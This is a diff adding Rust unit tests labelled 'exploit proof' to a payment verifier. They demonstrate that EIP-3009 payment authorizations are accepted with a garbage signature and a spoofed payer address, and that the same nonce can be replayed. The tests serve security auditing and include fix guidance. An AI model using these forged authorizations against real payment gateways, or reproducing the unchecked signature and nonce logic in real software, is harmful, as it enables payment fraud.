@@ -671,4 +671,157 @@ mod tests {
         assert_eq!(result.amount_usd, Decimal::ONE);
         assert!(result.invalidation_reason.is_none());
     }
+
+    // ── CRITICAL-1 exploit proof ─────────────────────────────────────────────
+    // Demonstrates that the eip3009 scheme accepts any payment claim without
+    // verifying the cryptographic signature. The _signature parameter in
+    // verify_eip3009 is intentionally unused (prefixed with _), so any value
+    // passes — including "0x00" or an empty string.
+    #[test]
+    fn critical1_forged_eip3009_accepted_without_valid_signature() {
+        use crate::types::EIP3009Authorization;
+        use std::time::{SystemTime, UNIX_EPOCH};
+
+        let now = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .as_secs();
+
+        let verifier = PaymentVerifier::new(gateway_address(), vec![usdc_address()]);
+
+        // Completely fabricated authorization: attacker supplies any `from`
+        // address they want to impersonate, a garbage signature, and valid
+        // timing fields. No on-chain funds are needed.
+        let forged_auth = EIP3009Authorization {
+            from: "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef".to_string(),
+            to: GATEWAY_ADDRESS.to_string(),
+            value: "5000000".to_string(), // 5 USDC raw (6 decimals) = $5
+            valid_after: now - 60,
+            valid_before: now + 3600,
+            nonce: "0x0000000000000000000000000000000000000000000000000000000000000001"
+                .to_string(),
+        };
+
+        let result = verifier
+            .verify_eip3009(
+                &forged_auth,
+                "0x00", // garbage — should be rejected, never checked
+                usdc_address(),
+                Decimal::from_str("1.0").unwrap(),
+            )
+            .expect("verify_eip3009 should not error");
+
+        // BUG: this assertion proves the vulnerability.
+        // A forged authorization with no valid signature is accepted.
+        assert!(
+            result.valid,
+            "CRITICAL-1: forged eip3009 payment was rejected — bug may be fixed"
+        );
+        assert_eq!(
+            format!("{:#x}", result.payer),
+            "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+            "payer address must match attacker-supplied `from` field"
+        );
+        assert!(result.invalidation_reason.is_none());
+    }
+
+    // Same exploit through the public verify_payment dispatch path —
+    // confirms the scheme routing in verify_payment reaches verify_eip3009.
+    #[test]
+    fn critical1_forged_eip3009_accepted_via_verify_payment_dispatch() {
+        use std::time::{SystemTime, UNIX_EPOCH};
+
+        let now = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .as_secs();
+
+        let verifier = PaymentVerifier::new(gateway_address(), vec![usdc_address()]);
+
+        let header = payment_header(
+            "eip3009",
+            2,
+            "eip155:999",
+            USDC_ADDRESS,
+            Some(EIP3009Authorization {
+                from: "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef".to_string(),
+                to: GATEWAY_ADDRESS.to_string(),
+                value: "5000000".to_string(),
+                valid_after: now - 60,
+                valid_before: now + 3600,
+                nonce: "0xdead".to_string(),
+            }),
+            None,
+        );
+
+        let result = verifier
+            .verify_payment(&header, Decimal::from_str("1.0").unwrap())
+            .expect("verify_payment should not error");
+
+        assert!(
+            result.valid,
+            "CRITICAL-1: forged eip3009 via dispatch was rejected — bug may be fixed"
+        );
+        assert_eq!(
+            format!("{:#x}", result.payer),
+            "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
+        );
+    }
+
+    // ── CRITICAL-2 exploit proof ─────────────────────────────────────────────
+    // Demonstrates that verify_eip3009 accepts the same nonce more than once.
+    // The function reads auth.nonce but never records it, so the identical
+    // authorization can be submitted repeatedly within its validity window.
+    //
+    // This test PASSES when the bug is present and FAILS when it is fixed.
+    // To fix: record the nonce on first acceptance and return an invalidation
+    // result (not an error) on any subsequent call with the same nonce.
+    #[test]
+    fn critical2_eip3009_same_nonce_accepted_twice() {
+        use crate::types::EIP3009Authorization;
+        use std::time::{SystemTime, UNIX_EPOCH};
+
+        let now = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .as_secs();
+
+        let verifier = PaymentVerifier::new(gateway_address(), vec![usdc_address()]);
+
+        // Fixed nonce — "c2" bytes are a mnemonic for CRITICAL-2.
+        let auth = EIP3009Authorization {
+            from: "0x70997970c51812dc3a010c7d01b50e0d17dc79c8".to_string(),
+            to: GATEWAY_ADDRESS.to_string(),
+            value: "5000000".to_string(), // 5 USDC raw (6 decimals) = $5
+            valid_after: now - 60,
+            valid_before: now + 3600,
+            nonce: "0xc2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2"
+                .to_string(),
+        };
+        let required_usd = Decimal::from_str("1.0").unwrap();
+
+        // First call — expected to succeed.
+        let first = verifier
+            .verify_eip3009(&auth, "0x00", usdc_address(), required_usd)
+            .expect("first verify_eip3009 should not error");
+
+        assert!(first.valid, "first call should be accepted");
+
+        // Second call — same nonce, same authorization, same verifier instance.
+        // BUG: this should return valid = false with an invalidation_reason of
+        // "nonce already used" (or similar). Instead it returns valid = true,
+        // proving the verifier carries no nonce state between calls.
+        let second = verifier
+            .verify_eip3009(&auth, "0x00", usdc_address(), required_usd)
+            .expect("second verify_eip3009 should not error");
+
+        assert!(
+            second.valid,
+            "CRITICAL-2: nonce was rejected on second use — bug may be fixed"
+        );
+        assert!(
+            second.invalidation_reason.is_none(),
+            "CRITICAL-2: nonce replay was flagged — bug may be fixed"
+        );
+    }
 }
